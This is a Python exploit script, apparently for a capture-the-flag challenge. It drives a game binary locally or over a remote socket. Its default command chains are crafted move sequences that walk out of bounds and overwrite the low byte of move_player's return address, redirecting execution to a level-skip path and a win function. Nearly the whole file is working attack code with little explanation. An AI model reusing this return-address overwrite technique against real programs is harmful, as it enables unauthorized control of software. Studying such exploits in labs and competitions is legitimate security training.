#!/usr/bin/env python3
import argparse
import socket
import subprocess
import sys
import time
import select
from pathlib import Path
import os
import stat
import re
from dataclasses import dataclass, field
from typing import Union


@dataclass
class Command:
    data: bytes            # raw bytes to send
    repeat: int = 1        # how many times to send this command

    def __iter__(self):
        for _ in range(self.repeat):
            yield self.data


@dataclass
class CommandChain:
    commands: list[Union['Command', 'CommandChain']
                   ] = field(default_factory=list)
    repeat: int = 1

    def __iter__(self):
        for _ in range(self.repeat):
            for cmd in self.commands:
                if isinstance(cmd, Command):
                    yield from cmd
                elif isinstance(cmd, CommandChain):
                    yield from cmd
                else:
                    raise TypeError(
                        f"Unsupported command type in CommandChain: {type(cmd)}")


# Shared sequence used for both Level 1 and Level 2
GOING_TO_LEVEL_5_MOVES = CommandChain(commands=[
    Command(data=b'd', repeat=(0x18 + 2 + (4 * 3) + 1 - 4)),
    Command(data=b'w', repeat=4),
    # Doing the change of the byte before overwriting the move_player's return address
    Command(data=b'l' + b'\x7f'),
    Command(data=b'w', repeat=1),
], repeat=4)

GO_TO_WIN_FUNC_MOVES = CommandChain(commands=[
    Command(data=b'd', repeat=0x18 + 2 + (4 * 3) + 1 - 4),
    Command(data=b'w', repeat=4),
    Command(data=b'l' + b'\xf4'), # Making the ret address point to the counter == 4 check
    Command(data=b'w', repeat=1),
])

# Default pre-commands, now using CommandChain for reuse
DEFAULT_PRE_CMDS: list[Union[Command, CommandChain]] = [
    GOING_TO_LEVEL_5_MOVES,
    GO_TO_WIN_FUNC_MOVES
]


class RemoteConn:
    def __init__(self, ip, port, timeout):
        self.sock = socket.create_connection((ip, port), timeout)
        self.sock.setblocking(False)

    def send(self, data: bytes):
        self.sock.sendall(data)

    def recv(self, timeout: float) -> bytes:
        ready, _, _ = select.select([self.sock], [], [], timeout)
        if ready:
            return self.sock.recv(4096) or b""
        return b""

    def close(self):
        self.sock.close()


class LocalConn:
    def __init__(self, path: Path):
        self.binary = path.resolve()
        self.proc = subprocess.Popen(
            [str(self.binary)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        fd = self.proc.stdout.fileno()
        os.set_blocking(fd, False)

    def send(self, data: bytes):
        if self.proc.stdin:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def recv(self, timeout: float) -> bytes:
        fd = self.proc.stdout.fileno()
        ready, _, _ = select.select([fd], [], [], timeout)
        if ready:
            return os.read(fd, 4096) or b""
        return b""

    def close(self):
        self.proc.terminate()
        self.proc.wait()


def recv_all(conn, timeout: float) -> bytes:
    buf = b""
    last = time.time()
    while True:
        part = conn.recv(timeout)
        if part:
            buf += part
            last = time.time()
        elif time.time() - last >= timeout:
            break
    return buf


def parse_pre_cmds(items: list[str]) -> list[Command]:
    cmds: list[Command] = []
    for item in items:
        # repeat syntax: e.g. 'w*4'
        if match := re.fullmatch(r'(.)(?:\*(\d+))', item):
            ch, count = match.groups()
            cmds.append(Command(data=ch.encode('ascii'), repeat=int(count)))
        # full hex literal sequence
        elif re.fullmatch(r'(\\x[0-9A-Fa-f]{2})+', item):
            hexstr = ''.join(re.findall(r'[0-9A-Fa-f]{2}', item))
            cmds.append(Command(data=bytes.fromhex(hexstr)))
        # lX where X is a hex value like 'l\x41'
        elif match := re.fullmatch(r'l\\x([0-9A-Fa-f]{2})', item):
            byte = bytes.fromhex(match.group(1))
            cmds.append(Command(data=b'l' + byte))
        # lX where X is a single character
        elif item.startswith('l') and len(item) == 2:
            cmds.append(Command(data=b'l' + item[1].encode('ascii')))
        # single character commands
        elif len(item) == 1:
            cmds.append(Command(data=item.encode('ascii')))
        else:
            raise ValueError(f"Invalid pre-cmd format: {item}")
    return cmds


def send_commands(conn, commands: list[Union[Command, CommandChain]], short_timeout: float, long_timeout: float, echo: bool = True) -> list[bytes]:
    responses = []
    for cmd in commands:
        for data in cmd:
            conn.send(data)
            timeout = long_timeout if data == b'p' else short_timeout
            resp = recv_all(conn, timeout)
            responses.append(resp)
            if echo and resp:
                sys.stdout.write(resp.decode(errors='ignore'))
                sys.stdout.flush()
    return responses


def interactive_mode(conn, short_timeout: float, long_timeout: float):
    print("[*] Enter commands to play the game. Type 'exit' to quit.")
    while True:
        try:
            user_in = input("> ").strip()
        except EOFError:
            break
        if user_in.lower() in ("exit", "quit"):
            break

        try:
            cmds = parse_pre_cmds([user_in])
            send_commands(conn, cmds, short_timeout, long_timeout)
        except Exception as e:
            print(f"[!] Error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="Game client via socket or local Popen")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--local", metavar="BINARY", type=Path,
                       help="Path to local binary to execute")
    group.add_argument("--remote", nargs=2, metavar=("IP", "PORT"),
                       help="Remote target IP and port")
    parser.add_argument("--pre-cmds", nargs="*", default=None,
                        help="Commands to auto-run before interactive mode")
    parser.add_argument("--short-timeout", type=float, default=0.4,
                        help="Timeout for fast commands (seconds)")
    parser.add_argument("--long-timeout", type=float, default=1.0,
                        help="Timeout for slower commands like 'p' (seconds)")
    parser.add_argument("--connect-timeout", type=float, default=5.0,
                        help="Connection timeout (only for remote)")
    args = parser.parse_args()

    commands = parse_pre_cmds(
        args.pre_cmds) if args.pre_cmds else DEFAULT_PRE_CMDS

    if args.local:
        binary: Path = args.local
        if not (binary.exists() and binary.is_file()):
            print(f"Error: binary not found '{binary}'", file=sys.stderr)
            sys.exit(1)
        if not (binary.stat().st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)):
            print(f"Error: binary not executable '{binary}'", file=sys.stderr)
            sys.exit(1)
        conn = LocalConn(binary)
        print(f"[+] Spawned local process '{binary}'")
    else:
        ip, port = args.remote
        conn = RemoteConn(ip, int(port), args.connect_timeout)
        print(f"[+] Connected to {ip}:{port}")

    try:
        banner = recv_all(conn, timeout=args.long_timeout)
        if banner:
            sys.stdout.write(banner.decode(errors='ignore'))
            sys.stdout.flush()

        if commands:
            print(
                f"[*] Running pre-commands: {args.pre_cmds or DEFAULT_PRE_CMDS}")
            send_commands(conn, commands, args.short_timeout,
                          args.long_timeout)

        interactive_mode(conn, args.short_timeout, args.long_timeout)
    finally:
        conn.close()
        print("\n[*] Connection closed.")


if __name__ == "__main__":
    main()
